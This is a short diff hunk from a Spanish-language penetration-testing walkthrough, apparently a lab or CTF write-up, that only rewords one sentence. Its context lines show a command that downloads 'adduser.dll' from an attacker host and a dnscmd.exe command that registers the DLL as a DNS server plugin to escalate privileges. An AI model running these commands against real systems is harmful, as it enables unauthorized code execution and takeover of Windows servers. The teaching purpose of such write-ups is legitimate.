@@ -441,7 +441,7 @@ wget "http://10.10.14.29:7777/adduser.dll" -outfile "adduser.dll"
 <img width="1192" height="138" alt="image" src="https://github.com/user-attachments/assets/06c7473e-eb4f-4c5b-a079-b7e29be8c4f9" />
 
 
-Cargamos la dll con el siguiente comando:
+Cargamos la dll en el registro con el siguiente comando:
 
 ```powershell
 dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\adduser.dll
